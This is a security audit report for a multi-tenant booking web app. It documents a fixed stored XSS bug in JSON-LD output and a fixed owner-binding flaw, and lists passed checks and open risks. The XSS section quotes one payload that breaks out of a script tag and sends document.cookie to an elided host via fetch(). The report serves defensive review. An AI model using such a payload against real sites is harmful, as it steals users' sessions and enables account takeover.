# Security & production-readiness audit

Run against `78dce9a` on 2026-08-24, before the first real onboarding. Every
"passed" below was checked against the code or against production, not inferred
from a comment — where the evidence is a live query, the result is quoted.

## Fixed during this audit

### 🔴 → ✅ Stored XSS on every public booking page

**Severity: critical. It was live.**

`/[slug]` emitted its JSON-LD through `dangerouslySetInnerHTML` with a bare
`JSON.stringify`, under a comment reading *"Serialised from our own database,
not user-controlled markup."* The database is exactly where the tenant's free
text lives: `business.name`, `description`, `address`, `phone` and every
service name all flow into that payload.

`JSON.stringify` escapes what JSON needs escaped. `<` is not one of those
characters. So a business named

```
</script><script>fetch('https://…?c='+document.cookie)</script>
```

— 62 characters, inside the 80 the settings form allows — ended the script
element early, and everything after it was parsed as markup by the browser of
every client who opened that shop's page.

What made it worth more than a self-inflicted wound: the page needs no login,
the URL is a genuine `bazman.app` address, and anyone can create a shop. That
is a phishing primitive, not a curiosity.

**Fixed** by `lib/json-ld.ts` — `serialiseJsonLd` escapes `<`, `>` and `&` to
their `\uXXXX` forms *after* serialisation, so nesting depth cannot hide a sink.
It is lossless to a JSON parser, so the structured data Google indexes is
unchanged. Four tests, including a round-trip that proves the escaping does not
corrupt legitimate Hebrew content containing `<` and `&`.

### 🔴 → ✅ Owner binding accepted an unconfirmed address

**Introduced by Phase 1 of this same session, and caught before it shipped.**

`claimPendingBusiness` binds a whole business — calendar, client list, phone
numbers — to whoever signs in with a matching address. The first cut checked
only that the addresses matched.

Supabase *does* gate sign-in on confirmation when the project has "Confirm
email" enabled. But that is a toggle in a dashboard this repository cannot see,
cannot test and does not control. A feature whose security rests on an
unrelated setting is one settings change away from tenant takeover: sign up as
`owner@shop.com` — an address usually printed on the shop's own door — and the
pilot's business is yours the moment the dashboard loads.

**Fixed** by requiring `user.email_confirmed_at` before the claim runs, asserted
in `dashboard-session.coverage.test.ts` including that the guard precedes the
claim rather than merely appearing in the file. The Supabase setting is now
defence in depth rather than the defence. A refused claim is not consumed — the
shop is still waiting on the next sign-in.

## Passed

| # | Check | Evidence |
| --- | --- | --- |
| 1 | **No secrets in git** | Only `.env.example` is tracked and every value in it is empty. `.gitignore` carries `.env*` with `!.env.example`. |
| 2 | **Service-role key unreachable from the client** | `supabase/admin.ts` has a runtime `assertServer()` **and** `admin-isolation.test.ts`, which fails the build if any `"use client"` module imports it. No non-`NEXT_PUBLIC_` env read exists in a client module. |
| 3 | **RLS on every table** | Queried production: **16 public tables, 16 with RLS**. `rls.test.ts` additionally asserts an owner policy on every table, that `anon` has no policy at all, and that no-policy tables are sealed rather than merely unpolicied. |
| 4 | **No IDOR** | Every dashboard action takes its business id from `requireBusiness()`/`requireWritable()`, never from the request body. A grep for a business id sourced from input returns nothing. A crafted payload cannot name another tenant. |
| 5 | **Write-guard coverage is mechanical** | `dashboard-session.coverage.test.ts` walks every `"use server"` file and fails if an exported action names no guard, with an explicit `EXEMPT` map. Skipping the gate cannot happen by omission. |
| 6 | **Session cookies hardened** | `httpOnly`, `secure` in production, `sameSite: lax`, `path: /` — spread *after* the library's own options so they cannot be weakened. `localStorage` holds only UI preferences (accessibility, cookie-banner dismissal, widget position); no tokens anywhere. |
| 7 | **Master routes guarded in depth** | `requireSuperAdmin` runs in the layout, again in all four pages, and again in all seven actions — because a server action is an ordinary POST endpoint and being rendered inside `/master` proves nothing. |
| 8 | **Rate limiting on everything sensitive** | Sign-in (IP + identity), sign-up, password reset (IP + identity + a 1/min cooldown that deliberately beats Supabase's own throttle so the answer is identical for registered and unregistered addresses), slot lookup, booking, waitlist join, and client history lookup. |
| 9 | **Passwords never logged or returned** | Supabase holds the credential; this codebase never sees a hash. A grep for a password, secret or token inside any `console.*` call returns nothing. Changing a password triggers a **global** sign-out, so every other session dies. |
| 10 | **No SQL injection** | Drizzle parameterises throughout. Exactly one `sql.raw` exists (trial extension); its input is `z.number().int().min(1).max(90)` and is then passed through `Math.trunc`, so the interpolated value cannot be anything but an integer. |
| 11 | **Server-side validation** | Zod on every mutating action. The three without it take an opaque token or a phone number, validate by type and shape, and are rate-limited; the token is a credential resolved by a parameterised query, so a malformed one simply does not resolve. |
| 12 | **File uploads** | MIME allowlist, 5 MB images / 25 MB video, and the stored path is `{businessId}/{kind}/{server-generated UUID}.{ext}` — the UUID is asserted against a pattern and the extension comes from a lookup table keyed by the validated content type. **The client's filename never reaches the path**, so `..` and double-extension tricks have nothing to act on. |
| 13 | **CORS** | No `Access-Control-Allow-Origin` is set anywhere. Same-origin by default, no wildcard. |
| 14 | **Webhooks** | **None exist.** The only API routes are `/api/cron/notifications` (rejects without `Authorization: Bearer $CRON_SECRET`, and refuses to run at all if the secret is unset rather than defaulting open) and `/auth/confirm`. |
| 15 | **No open redirect** | `/auth/confirm` allowlists the link types it will relay and routes every destination through `safe-redirect.ts` rather than trusting the query. |
| 16 | **No unsafe HTML** | After the JSON-LD fix, `dangerouslySetInnerHTML` appears once in the codebase and is the escaped serialiser. No `innerHTML`, no `eval`. All tenant and client text renders as JSX children, which React escapes. |

## 🔴 Requires your decision

These are not code defects. Each needs an action or an accepted risk.

### 1. Confirm that "Confirm email" is ON in the Supabase project

The claim path now defends itself, so tenant takeover via owner binding is
closed either way. But **sign-up in general** still depends on this setting: with
it off, anyone can create an account on any address without proving they own
it. Check Supabase → Authentication → Providers → Email.

### 2. Client email still reaches nobody

Unchanged from earlier sessions and unrelated to this audit, but it is the
reason it matters here: email is the *last* fallback in the channel walk, so a
shop without WhatsApp reaches no one at all, and the booking looks fine from the
owner's side. Resend rejects every recipient with a `403` for want of a verified
domain. **This is a soft-launch blocker.**

### 3. Deleting the operator account would delete unclaimed businesses

`owner_user_id` references `auth.users` with `ON DELETE CASCADE`, and a pending
business is owned by the operator who created it until claimed. Claimed shops
are unaffected. This is the price of not loosening `owner_user_id` to nullable —
a 29-site change — and is documented in migration 0028. Revisit if pending
businesses ever outlive a single onboarding session.

### 4. Minor: the cron route returns its error message

`/api/cron/notifications` returns `(error as Error).message` on failure. It is a
message rather than a stack, and the caller has already presented
`CRON_SECRET` — so this is a trusted caller receiving a diagnostic, and it is
genuinely useful there. Left as-is deliberately; noted so the decision is
visible rather than accidental.

## Not covered by this audit

- **No penetration testing.** This is a code and configuration review.
- **Supabase project settings** beyond what the code can assert — session
  lifetimes, password policy, provider configuration.
- **Dependency CVEs.** No `npm audit` triage was run as part of this.
- **The browser.** Nothing here was verified by driving a real session; the
  dashboard remains unlooked-at, as `PROJECT_PLAN.md` §5 records.
